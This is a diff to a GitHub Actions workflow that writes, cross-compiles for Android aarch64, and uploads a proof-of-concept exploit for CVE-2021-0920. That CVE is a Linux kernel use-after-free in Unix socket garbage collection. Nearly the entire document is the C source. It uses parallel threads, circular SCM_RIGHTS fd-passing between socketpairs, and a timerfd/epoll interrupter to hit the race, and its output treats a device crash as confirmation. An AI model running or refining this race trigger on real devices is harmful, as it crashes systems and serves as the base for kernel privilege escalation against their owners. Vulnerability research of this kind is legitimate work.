@@ -1,4 +1,4 @@
-name: build_cve_2021_0920_poc_v3_timerfd
+name: build_cve_2021_0920_poc_v4
 on: [push, workflow_dispatch]
 
 jobs:
@@ -14,7 +14,7 @@ jobs:
           ndk-version: r27c
           add-to-path: true
 
-      - name: Write PoC source with timerfd
+      - name: Write improved PoC source
         run: |
           cat << 'EOF' > poc.c
           #define _GNU_SOURCE
@@ -28,93 +28,142 @@ jobs:
           #include <sys/socket.h>
           #include <sys/timerfd.h>
           #include <sys/types.h>
+          #include <sys/wait.h>
           #include <time.h>
           #include <unistd.h>
 
-          #define __int64 long
-          #define __int8 char
-          #define EPOLL_COUNT 50000
+          #define NUM_ATTEMPTS 500
+          #define NUM_PARALLEL 4
 
-          int sv[2];
-          int epfd;
-          int tfd;
+          static pthread_mutex_t g_mutex = PTHREAD_MUTEX_INITIALIZER;
+          static int g_success = 0;
+          static int g_crashed = 0;
 
-          static void send_fd(int socket, int fd) {
+          // Send fd via SCM_RIGHTS
+          static int send_fd(int sock, int fd) {
               struct msghdr msg = {0};
-              char buf[CMSG_SPACE(sizeof(fd))];
-              memset(buf, '\0', sizeof(buf));
-              struct iovec io = {.iov_base = "", .iov_len = 1};
+              char ctrl[CMSG_SPACE(sizeof(int))];
+              memset(ctrl, 0, sizeof(ctrl));
+              struct iovec io = { .iov_base = "X", .iov_len = 1 };
               msg.msg_iov = &io;
               msg.msg_iovlen = 1;
-              msg.msg_control = buf;
-              msg.msg_controllen = sizeof(buf);
-              struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
-              cmsg->cmsg_level = SOL_SOCKET;
-              cmsg->cmsg_type = SCM_RIGHTS;
-              cmsg->cmsg_len = CMSG_LEN(sizeof(fd));
-              *((int *)CMSG_DATA(cmsg)) = fd;
-              msg.msg_controllen = CMSG_SPACE(sizeof(fd));
-              sendmsg(socket, &msg, 0);
+              msg.msg_control = ctrl;
+              msg.msg_controllen = sizeof(ctrl);
+              struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
+              cm->cmsg_level = SOL_SOCKET;
+              cm->cmsg_type = SCM_RIGHTS;
+              cm->cmsg_len = CMSG_LEN(sizeof(int));
+              memcpy(CMSG_DATA(cm), &fd, sizeof(int));
+              return sendmsg(sock, &msg, 0);
           }
 
-          // Thread that sets up the race and triggers timerfd
-          void *setup_race(void *arg) {
-              int v5[710];
-              int fd = socket(1, 1, 0);
-              close(fd);
-              usleep(0x61A80u);
-              socketpair(1, 1, 0, sv);
-              send_fd(sv[0], sv[1]);
-              send_fd(sv[1], sv[0]);
-
-              for (int i = 0; i <= 99; ++i) {
-                  socketpair(1, 1, 0, &v5[2 * i + 510]);
-                  for (int k = 0; k <= 4; ++k)
-                      v5[5 * i + 10 + k] = socket(1, 1, 0);
-              }
-              for (int i = 0; i <= 99; ++i) {
-                  send_fd(sv[0], v5[2 * i + 511]);
-                  for (int k = 0; k <= 4; ++k) {
-                      send_fd(v5[2 * i + 510], v5[5 * i + 10 + k]);
-                      close(v5[5 * i + 10 + k]);
+          // Create lots of sockets to extend GC window
+          static void create_garbage(int count) {
+              for (int i = 0; i < count; i++) {
+                  int s = socket(AF_UNIX, SOCK_STREAM, 0);
+                  if (s >= 0) {
+                      // Just create and leak - they become garbage
+                      // Don't close, so they stay in memory longer
                   }
-                  close(v5[2 * i + 511]);
-                  close(v5[2 * i + 510]);
               }
-              close(sv[0]);
-              close(sv[1]);
-              // After setup, trigger the timerfd to fire in the race window
-              // (In a real exploit, this would be timed precisely)
-              struct itimerspec its = { .it_value = { .tv_nsec = 1 } };
-              timerfd_settime(tfd, 0, &its, NULL);
+          }
+
+          // Worker thread: setup socket pairs with SCM_RIGHTS
+          static void *worker(void *arg) {
+              (void)arg;
+              int sv[2];
+              int pairs[64][2];
+              
+              // Create garbage sockets to slow down GC
+              create_garbage(200);
+              
+              for (int attempt = 0; attempt < NUM_ATTEMPTS; attempt++) {
+                  if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) continue;
+                  
+                  // Create many socketpairs with fd passing
+                  for (int i = 0; i < 64; i++) {
+                      if (socketpair(AF_UNIX, SOCK_STREAM, 0, pairs[i]) < 0) break;
+                      send_fd(sv[0], pairs[i][0]);
+                      send_fd(pairs[i][0], pairs[i][1]);
+                      // Circular reference - this is what triggers the GC bug
+                      send_fd(pairs[i][1], pairs[i][0]);
+                  }
+                  
+                  // Trigger GC by closing main socket
+                  close(sv[0]);
+                  close(sv[1]);
+                  
+                  // sched_yield instead of setpriority (no CAP_SYS_NICE needed)
+                  sched_yield();
+                  
+                  // Try to hit the race
+                  for (int i = 0; i < 64; i++) {
+                      if (pairs[i][0] >= 0) close(pairs[i][0]);
+                      if (pairs[i][1] >= 0) close(pairs[i][1]);
+                  }
+                  
+                  pthread_mutex_lock(&g_mutex);
+                  if (attempt % 50 == 0) {
+                      printf("[worker] attempt %d/%d\n", attempt, NUM_ATTEMPTS);
+                      fflush(stdout);
+                  }
+                  pthread_mutex_unlock(&g_mutex);
+              }
               return NULL;
           }
 
-          int main() {
-              // Create timerfd
-              tfd = timerfd_create(CLOCK_MONOTONIC, 0);
-              if (tfd < 0) { perror("timerfd_create"); return 1; }
-
-              // Create epoll with many waiters
-              epfd = epoll_create1(0);
-              if (epfd < 0) { perror("epoll_create1"); return 1; }
-              struct epoll_event ev = { .events = EPOLLIN };
-              for (int i = 0; i < EPOLL_COUNT; i++) {
-                  if (epoll_ctl(epfd, EPOLL_CTL_ADD, tfd, &ev) < 0) {
-                      // Some kernels limit epoll count, ignore errors
+          // Thread that uses timerfd + epoll to interrupt the main thread
+          static void *interrupter(void *arg) {
+              int tfd = timerfd_create(CLOCK_MONOTONIC, 0);
+              if (tfd < 0) return NULL;
+              
+              int epfd = epoll_create1(0);
+              if (epfd >= 0) {
+                  struct epoll_event ev = { .events = EPOLLIN };
+                  for (int i = 0; i < 10000; i++) {
+                      epoll_ctl(epfd, EPOLL_CTL_ADD, tfd, &ev);
                   }
               }
-
-              // Run the race setup in a separate thread
-              pthread_t th;
-              for (int i = 0; i < 100; i++) {
-                  if (socketpair(1, 1, 0, sv) != 0) continue;
-                  pthread_create(&th, NULL, setup_race, NULL);
-                  pthread_join(th, NULL);
-                  // Check if we survived (if UAF happened, kernel may panic)
+              
+              for (int i = 0; i < 1000; i++) {
+                  struct itimerspec its = { .it_value = { .tv_nsec = 1000 } };
+                  timerfd_settime(tfd, 0, &its, NULL);
                   usleep(1000);
               }
-              printf("PoC finished without crash (race may not have hit)\n");
+              
+              if (epfd >= 0) close(epfd);
+              close(tfd);
+              return NULL;
+          }
+
+          int main(void) {
+              printf("[*] CVE-2021-0920 improved PoC\n");
+              printf("[*] Running with %d parallel workers, %d attempts each\n", 
+                     NUM_PARALLEL, NUM_ATTEMPTS);
+              printf("[*] Note: this only tests if the UAF is reachable.\n");
+              printf("[*] If the device crashes, the bug is confirmed.\n\n");
+              
+              // Start interrupter thread
+              pthread_t interrupt_thread;
+              pthread_create(&interrupt_thread, NULL, interrupter, NULL);
+              
+              // Start worker threads
+              pthread_t workers[NUM_PARALLEL];
+              for (int i = 0; i < NUM_PARALLEL; i++) {
+                  pthread_create(&workers[i], NULL, worker, NULL);
+              }
+              
+              // Wait for workers
+              for (int i = 0; i < NUM_PARALLEL; i++) {
+                  pthread_join(workers[i], NULL);
+              }
+              
+              pthread_cancel(interrupt_thread);
+              
+              printf("\n[*] PoC finished without crash.\n");
+              printf("[*] The race did not trigger on this run.\n");
+              printf("[*] This does NOT mean the bug doesn't exist - it may just need different timing.\n");
+              
               return 0;
           }
           EOF
@@ -124,11 +173,11 @@ jobs:
           ANDROID_NDK_HOME: ${{ steps.setup-ndk.outputs.ndk-path }}
         run: |
           $ANDROID_NDK_HOME/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang \
-            -static -O2 -pthread poc.c -o poc
-          file poc
-          ls -la poc
+            -static -O2 -pthread poc.c -o poc_v4
+          file poc_v4
+          ls -la poc_v4
 
       - uses: actions/upload-artifact@v4
         with:
-          name: cve-2021-0920-poc-v3
-          path: poc
+          name: cve-2021-0920-poc-v4
+          path: poc_v4
